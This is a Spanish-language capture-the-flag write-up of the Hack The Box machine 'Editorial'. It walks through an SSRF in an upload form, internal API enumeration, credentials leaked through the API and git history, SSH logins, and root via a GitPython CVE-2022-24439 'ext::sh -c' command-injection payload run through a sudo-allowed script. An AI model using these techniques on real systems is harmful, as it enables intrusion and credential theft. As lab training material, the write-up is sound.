---
title: Editorial
description: Editorial es una máquina Linux de dificultad fácil que presenta una aplicación web de publicación vulnerable a Server-Side Request Forgery (SSRF). Esta vulnerabilidad se aprovecha para obtener acceso a una API interna en ejecución, lo que a su vez permite obtener credenciales que conducen al acceso SSH a la máquina. Una mayor enumeración del sistema revela un repositorio Git, que se utiliza para encontrar credenciales de un nuevo usuario. El usuario root se puede obtener explotando la vulnerabilidad CVE-2022-24439 y la configuración de sudo.
date: 2024-06-28
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-editorial/editorial_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - api
  - data_leaks
  - ssrf
  - cve
  - rce
  - git
  - sudo_abuse
  - ssh
  - http
  - tcp
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/editorial:-$ ping -c 1 10.10.11.20

PING 10.10.11.20 (10.10.11.20) 56(84) bytes of data.
64 bytes from 10.10.11.20: icmp_seq=1 ttl=63 time=359 ms

--- 10.10.11.20 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 359.328/359.328/359.328/0.000 ms
```

```terminal
/home/kali/Documents/htb/machines/editorial:-$ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.20 -oG map1

Host: 10.10.11.20 ()    Status: Up
Host: 10.10.11.20 ()    Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```

```terminal
/home/kali/Documents/htb/machines/editorial:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.20 -oN map2

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; 
protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gt
as1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM= 
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/editorial:-$ echo '10.10.11.20\teditorial.htb' | sudo tee -a /etc/hosts

/home/kali/Documents/htb/machines/editorial:-$ whatweb editorial.htb

http://editorial.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.20], Title[Editorial Tiempo Arriba], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

---
## Web Analysis

El sitio parece ser una plataforma para publicar libros.

![](/assets/img/htb-writeup-editorial/editorial1.png)

El enlace 'Publish with us' contiene un formulario para cargar datos.

![](/assets/img/htb-writeup-editorial/editorial1_2.png)

A primera vista, analizando el comportamiento de dicho formulario, no se encontró nada relevante.

![](/assets/img/htb-writeup-editorial/editorial1_3.png)

Sin embargo, después de un tiempo, identifiqué que el formulario es vulnerable a Server Side Request Forgery (SSRF).

---
## Vulnerability Exploitation

Aprovechando esta vulnerabilidad, inicié una búsqueda de puertos internos.

![](/assets/img/htb-writeup-editorial/editorial2.png)

Utilizando el Intruder, realicé un ataque de tipo Sniper para fuzzear el campo del puerto, probando los 65,535 puertos de la máquina local.

![](/assets/img/htb-writeup-editorial/editorial3.png)

![](/assets/img/htb-writeup-editorial/editorial4.png)

La respuesta del servidor para el puerto 5000 destacó del resto, por la longitud de la misma.

![](/assets/img/htb-writeup-editorial/editorial5.png)

![](/assets/img/htb-writeup-editorial/editorial6.png)

Tras investigar este puerto, descubrí que la API asociada era diferente a las demás.

```
static/uploads/8db015bc-1a40-4ad0-bec5-343fc7203220
```

![](/assets/img/htb-writeup-editorial/editorial7.png)

Si reviso la respuesta para esta API, lo que encuentro es una lista de API endpoints.

```
GET static/uploads/8db015bc-1a40-4ad0-bec5-343fc7203220
```

![](/assets/img/htb-writeup-editorial/editorial8.png)

El endpoint '/api/latest/metadata/messages/authors' es el que más llama la atención y en el que, una vez investigado, se encuentra la última API con contenido sensible.

![](/assets/img/htb-writeup-editorial/editorial9.png)

```
GET /static/uploads/ef8d7cfd-7858-4b46-96fc-9590106d5306	
```

![](/assets/img/htb-writeup-editorial/editorial10.png)

```terminal
/home/kali/Documents/htb/machines/editorial:-$ ssh dev@10.10.11.20 
dev@10.10.11.20's password: dev080217_devAPI!@

dev@editorial:~$ cat user.txt
```

---
## User pivoting

Antes de enumerar todo el sistema, inspeccioné manualmente los archivos disponibles.

En el directorio personal del usuario 'dev', encontré un subdirectorio llamado 'apps', que contenía un repositorio '.git' con varios commits.

```terminal
dev@editorial:~/apps/.git/logs$ cat HEAD

0000000000000000000000000000000000000000 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 dev-
carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905723 -0500   commit 
(initial): feat: create editorial app

3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28 dev-
carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905870 -0500   commit: 
feat: create api to editorial info

1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-
carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500   commit: 
change(api): downgrading prod to dev

b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dfef9f20e57d730b7d71967582035925d57ad883 dev-
carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906471 -0500   commit: 
change: remove debug and update api port

dfef9f20e57d730b7d71967582035925d57ad883 8ad0f3187e2bda88bba85074635ea942974587e8 dev-
carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906661 -0500   commit: 
fix: bugfix in api port endpoint
```

Al revisar el commit titulado 'downgrading prod to dev', descubrí las credenciales para el usuario 'prod'.

```terminal
dev@editorial:~/apps/.git/logs$ git show 1e84a03

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500
+@app.route(api_route + '/authors/message', methods=['GET'])
+def api_mail_new_authors():
+    return jsonify({
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and
can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for
our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease
be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to
reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, "
+ api_editorial_name + " Team."
```

```terminal
/home/kali/Documents/htb/machines/editorial:-$ ssh prod@10.10.11.20
prod@10.10.11.20's password: 080217_Producti0n_2023!@
```

---
## Privilege Escalation

```terminal
prod@editorial:~$ sudo -l
[sudo] password for prod: 080217_Producti0n_2023!@
Matching Defaults entries for prod on editorial:
  env_reset, mail_badpass,secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User prod may run the following commands on editorial:
  (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

Este usuario puede ejecutar el comando '/usr/bin/python3' y '/opt/internal_apps/clone_changes/clone_prod_change.py' con privilegios de root.

```terminal
prod@editorial:/opt/internal_apps/clone_changes$ cat clone_prod_change.py 

#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

```terminal
prod@editorial:~$ pip freeze | grep -i gitpython
GitPython==3.1.29
```

Tras analizar el código del script y la versión de GitPython instalada en el sistema, identifiqué una vulnerabilidad de ejecución remota de código (RCE).

<https://nvd.nist.gov/vuln/detail/CVE-2022-24439>

Para aprovechar esta vulnerabilidad, creé un archivo vacío llamado root.txt en el directorio /home/prod/.

```terminal
prod@editorial:~$ echo "" > root.txt
```

El siguiente comando ejecuta el script 'clone_prod_change.py', pasando un argumento que aprovecha la operación de clonación en Git. Esto permite ejecutar un comando de shell que lee el contenido del archivo '/root/root.txt' y lo escribe en '/home/prod/root.txt'. De esta manera, el usuario 'prod' puede acceder al contenido del archivo '/root/root.txt' mediante el uso de un vector de ataque basado en Git."

```terminal
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c cat% /root/root.txt% >% /home/prod/root.txt"

[sudo] password for prod: 
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
	git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
	  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c cat% /root/root.txt% >% /home/prod/root.txt new_changes
	  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.
Please make sure you have the correct access rights and the repository exists.'
```
```terminal
prod@editorial:~$ cat root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/608" target="_blank">***Litio7 has successfully solved Editorial from Hack The Box***</a>
{: .prompt-info style="text-align:center" }
